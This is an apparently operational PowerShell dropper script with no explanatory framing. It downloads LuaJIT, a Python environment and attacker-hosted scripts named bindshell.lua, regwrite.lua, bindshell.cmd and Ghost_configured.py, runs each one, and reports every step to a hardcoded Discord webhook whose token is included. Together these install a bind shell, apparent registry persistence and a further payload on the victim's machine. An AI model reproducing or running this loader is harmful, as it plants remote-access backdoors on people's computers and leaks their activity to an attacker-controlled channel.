# Define paths and URLs
$baseDir = "$env:TEMP\ZZ"
$luaZip = "$baseDir\lua-5.4.2_Win64_bin.zip"
$luaZipUrl = "https://sourceforge.net/projects/luabinaries/files/5.4.2/Tools%20Executables/lua-5.4.2_Win64_bin.zip/download"
$luaJitZip = "$baseDir\LuaJIT-2.1.zip"
$luaJitUrl = "https://github.com/invisibleghostshell-ux/lua/raw/main/LuaJIT-2.1.zip"
$bindshellScriptUrl = "https://raw.githubusercontent.com/invisibleghostshell-ux/lua/main/bindshell.lua"
$regwriteScriptUrl = "https://raw.githubusercontent.com/invisibleghostshell-ux/lua/main/regwrite.lua"
$bindshellCmdUrl = "https://raw.githubusercontent.com/invisibleghostshell-ux/lua/main/bindshell.cmd"
$pythonEnvZipUrl = "https://www.dropbox.com/scl/fi/6ghhk00dw3zalvia56prb/env.zip?rlkey=n5qj3jwp18jj0jiw31r7vtcrd&st=80f4xypt&dl=1"
$ghostConfigPyUrl = "https://raw.githubusercontent.com/invisibleghostshell-ux/lua/main/Ghost_configured.py"
$bindshellScriptPath = "$baseDir\bindshell.lua"
$regwriteScriptPath = "$baseDir\regwrite.lua"
$bindshellCmdPath = "$baseDir\bindshell.cmd"
$pythonEnvZipPath = "$baseDir\python-env.zip"
$ghostConfigPyPath = "$baseDir\Ghost_configured.py"
$pythonEnvPath = "$baseDir\env"
$discordWebhookUrl = "https://discord.com/api/webhooks/1268854626288140372/Jp_jALGydP2E3ZGckb3FOVzc9ZhkJqKxsKzHVegnO-OIAwAWymr6lsbjCK0DAP_ttRV2"
$luaJitPath = "$baseDir\LuaJIT-2.1"
$luaPathDir = "$baseDir\Luapath"
$jitDir = "$luaPathDir\src\jit"
$srcDir = "$luaPathDir\src"
$jitSourceDir = "$luaJitPath"

# Function to send messages to Discord webhook
function Send-DiscordMessage {
    param (
        [string]$message
    )
    $payload = @{
        content = $message
    } | ConvertTo-Json
    Invoke-RestMethod -Uri $discordWebhookUrl -Method Post -Body $payload -ContentType 'application/json'
}

# Function to check if a file exists and wait if it doesn't
function Wait-ForFile {
    param (
        [string]$FilePath,
        [int]$Timeout = 60000
    )
    $startTime = Get-Date
    while (-not (Test-Path -Path $FilePath)) {
        Start-Sleep -Seconds 1
        if ($startTime.AddMilliseconds($Timeout) -lt (Get-Date)) {
            $message = "Timeout waiting for file ${FilePath} to appear."
            Send-DiscordMessage -message $message
            exit 1
        }
    }
}

# Function to get a file using curl
function Get-File {
    param (
        [string]$url,
        [string]$destination
    )
    try {
        $message = "Getting file from $url to $destination..."
        Send-DiscordMessage -message $message
        Start-Process -FilePath "curl" -ArgumentList "-L", $url, "-o", $destination -NoNewWindow -Wait
        Wait-ForFile -FilePath $destination
        $message = "Download completed: $destination"
        Send-DiscordMessage -message $message
    } catch {
        $message = "Error getting file from: $(${_})"
        Send-DiscordMessage -message $message
        exit 1
    }
}

# Function to wait for a minute
function Wait-ForMinute {
    Send-DiscordMessage -message "Waiting for 10 seconds before next step..."
    Start-Sleep -Seconds 5
}

# Function to copy files with wait and notification
function Copy-File {
    param (
        [string]$Source,
        [string]$Destination
    )
    try {
        Copy-Item -Path $Source -Destination $Destination -Force
        $message = "Copied $Source to $Destination"
        Send-DiscordMessage -message $message
    } catch {
        $message = "Error copying $Source to $Destination $(${_})"
        Send-DiscordMessage -message $message
        exit 1
    }
}

# Function to get and extract LuaJIT
function Get-And-Extract-LuaJIT {
    if (-not (Test-Path "$luaJitPath\src\luajit.exe")) {
        $message = "Getting LuaJIT ZIP file..."
        Send-DiscordMessage -message $message
        # Get the ZIP file
        if (-not (Test-Path $luaJitZip)) {
            Get-File -url $luaJitUrl -destination $luaJitZip
            Wait-ForMinute

            # Wait for the download to complete
            Wait-ForFile -FilePath $luaJitZip
        }

        if (-not (Test-Path "$luaJitPath")) {
            $message = "Extracting LuaJIT ZIP file..."
            Send-DiscordMessage -message $message
            # Extract the ZIP file
            try {
                Expand-Archive -Path $luaJitZip -DestinationPath $baseDir
                $message = "Extraction completed to: $luaJitPath"
                Send-DiscordMessage -message $message
            } catch {
                $message = "Error extracting LuaJIT ZIP file: $(${_})"
                Send-DiscordMessage -message $message
                exit 1
            }
        } else {
            $message = "LuaJIT directory already exists: $luaJitPath"
            Send-DiscordMessage -message $message
        }

        # Confirm build by checking for luajit.exe
        Wait-ForFile -FilePath "$luaJitPath\src\luajit.exe"
        Wait-ForMinute
    } else {
        $message = "LuaJIT executable already exists: $luaJitPath\src\luajit.exe"
        Send-DiscordMessage -message $message
    }
}

# Function to download, wait, and execute Ghost_configured.py with python.exe
function Get-Execute-GhostConfig {
    if (-not (Test-Path $ghostConfigPyPath)) {
        $message = "Getting Ghost_configured.py..."
        Send-DiscordMessage -message $message
        Get-File -url $ghostConfigPyUrl -destination $ghostConfigPyPath
        Wait-ForMinute
    }

    if (-not (Test-Path "$pythonEnvPath\env\python.exe")) {
        $message = "Getting Python environment ZIP file..."
        Send-DiscordMessage -message $message
        Get-File -url $pythonEnvZipUrl -destination $pythonEnvZipPath
        Wait-ForMinute

        $message = "Extracting Python environment ZIP file..."
        Send-DiscordMessage -message $message
        Expand-Archive -Path $pythonEnvZipPath -DestinationPath $pythonEnvPath
        Wait-ForFile -FilePath "$pythonEnvPath\env\python.exe"
        Send-DiscordMessage -message "Extraction of Python environment completed."
    }

    if (Test-Path "$pythonEnvPath\env\python.exe") {
        $message = "Executing Ghost_configured.py with python.exe..."
        Send-DiscordMessage -message $message
        Start-Process -FilePath "$pythonEnvPath\env\python.exe" -ArgumentList $ghostConfigPyPath -NoNewWindow -Wait
        $message = "Execution of Ghost_configured.py completed."
        Send-DiscordMessage -message $message
    } else {
        $message = "Python environment setup failed, python.exe not found."
        Send-DiscordMessage -message $message
    }
}

# Create the base directory if it doesn't exist
if (-not (Test-Path $baseDir)) {
    New-Item -Path $baseDir -ItemType Directory -Force
    Send-DiscordMessage -message "Created base directory: $baseDir"
}

# Get LuaJIT if not already done
Get-And-Extract-LuaJIT

# Download and extract Lua if not already done
if (-not (Test-Path "$baseDir\lua54.exe")) {
    $message = "Getting Lua ZIP file..."
    Send-DiscordMessage -message $message
    # Get the ZIP file
    if (-not (Test-Path $luaZip)) {
        Get-File -url $luaZipUrl -destination $luaZip
        Wait-ForMinute

        # Wait for the download to complete
        Wait-ForFile -FilePath $luaZip
    }

    $message = "Extracting Lua ZIP file..."
    Send-DiscordMessage -message $message
    # Extract the ZIP file
    try {
        Expand-Archive -Path $luaZip -DestinationPath $baseDir
        $message = "Extraction completed to: $baseDir"
        Send-DiscordMessage -message $message
    } catch {
        $message = "Error extracting Lua ZIP file: $(${_})"
        Send-DiscordMessage -message $message
        exit 1
    }
} else {
    $message = "Lua executable already exists: $baseDir\lua54.exe"
    Send-DiscordMessage -message $message
}

# Create the Luapath directory and subdirectories if they don't exist
if (-not (Test-Path -Path $luaPathDir)) {
    New-Item -Path $luaPathDir -ItemType Directory -Force
    Send-DiscordMessage -message "Created directory: $luaPathDir"
}

if (-not (Test-Path -Path $srcDir)) {
    New-Item -Path $srcDir -ItemType Directory -Force
    Send-DiscordMessage -message "Created directory: $srcDir"
}

if (-not (Test-Path -Path $jitDir)) {
    New-Item -Path $jitDir -ItemType Directory -Force
    Send-DiscordMessage -message "Created directory: $jitDir"
}

# Copy LuaJIT JIT files
$jitSourceDir = "$luaJitPath\src\jit"
if (Test-Path -Path $jitSourceDir) {
    Copy-File -Source "$jitSourceDir\*" -Destination $jitDir
    Wait-ForMinute
} else {
    $message = "JIT source directory does not exist: $jitSourceDir"
    Send-DiscordMessage -message $message
    exit 1
}

# Copy luajit.exe and lua51.dll to Luapath base directory
if (Test-Path -Path "$luaJitPath\src\luajit.exe") {
    Copy-File -Source "$luaJitPath\src\luajit.exe" -Destination "$luaPathDir\luajit.exe"
} else {
    $message = "luajit.exe does not exist in the source directory: $luaJitPath\src"
    Send-DiscordMessage -message $message
    exit 1
}

if (Test-Path -Path "$luaJitPath\src\lua51.dll") {
    Copy-File -Source "$luaJitPath\src\lua51.dll" -Destination "$luaPathDir\lua51.dll"
} else {
    $message = "lua51.dll does not exist in the source directory: $luaJitPath\src"
    Send-DiscordMessage -message $message
    exit 1
}

Wait-ForMinute

# Download Lua scripts and cmd file
$scriptUrls = @{
    "bindshell.lua" = $bindshellScriptUrl
    "regwrite.lua" = $regwriteScriptUrl
    "bindshell.cmd" = $bindshellCmdUrl
}

foreach ($script in $scriptUrls.Keys) {
    $url = $scriptUrls[$script]
    $path = Join-Path -Path $baseDir -ChildPath $script
    if (-not (Test-Path $path)) {
        Get-File -url $url -destination $path
        Wait-ForMinute
    } else {
        $message = "$script already exists: $path"
        Send-DiscordMessage -message $message
    }
}

# Execute the Lua scripts and cmd file
try {
    Start-Process -FilePath "$luaPathDir\luajit.exe" -ArgumentList "$regwriteScriptPath" -NoNewWindow -Wait
    Start-Process -FilePath "$luaPathDir\luajit.exe" -ArgumentList "$bindshellScriptPath" -NoNewWindow -Wait
    Start-Process -FilePath "$bindshellCmdPath" -NoNewWindow -Wait
    $message = "Lua scripts and cmd file executed successfully."
    Send-DiscordMessage -message $message
} catch {
    $message = "Error executing scripts and cmd file: $(${_})"
    Send-DiscordMessage -message $message
    Wait-ForMinute
    pause
}

# Download and execute Ghost_configured.py with Python
Get-Execute-GhostConfig
